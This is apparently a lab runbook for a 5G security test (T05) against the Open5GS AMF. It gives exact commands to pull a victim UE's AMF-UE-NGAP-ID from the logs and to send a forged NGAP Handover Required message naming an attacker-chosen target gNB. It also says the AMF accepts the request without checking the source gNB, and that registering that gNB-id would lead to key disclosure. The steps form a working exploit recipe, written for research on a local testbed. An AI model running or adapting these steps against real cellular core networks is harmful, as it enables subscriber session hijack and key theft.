# Open5GS — Handover Required → forced relocation / no-binding (T05)

Git Bash, from `ngap_tester/`. Terminals / live logs / how to verify: see [`../README.md`](../README.md).

**1. Core + RAN**
```bash
( cd ../5g-lab && ./scripts/core.sh up open5gs && ./scripts/ran.sh up ueransim open5gs )
```
**2. Victim AMF-UE-NGAP-ID**
```bash
V=$(docker logs o5gs-amf 2>&1 | grep 'ngap-handler.c:815' | grep -oE 'AMF_UE_NGAP_ID\[[0-9]+\]' | tail -1 | grep -oE '[0-9]+'); echo $V
```
**3. Capture + fire** (target gNB-id is attacker-chosen, unregistered here)
```bash
CFG_CORE=open5gs ./capture_attack.sh open5gs_T05_handover_required \
    o5gs-amf o5gs-smf ueransim-open5gs-ueransim-gnb-1 net-5glab 30 \
    -- handover-required --amf-ue-id $V --ran-ue-id 99 --target-gnb-id 0xABCDE
```
**Expect:** NGAP **12 + 9** in `amf_ngap_nas_sbi.pcap` — the AMF located the victim with no
source-gNB binding (`ngap-handler.c:3519`), then sent Error Indication because target gNB
`0xABCDE` isn't registered. (Full key disclosure would follow if the attacker registers that gNB-id.)
**Restore:** `docker restart ueransim-open5gs-ueransim-ue-1`
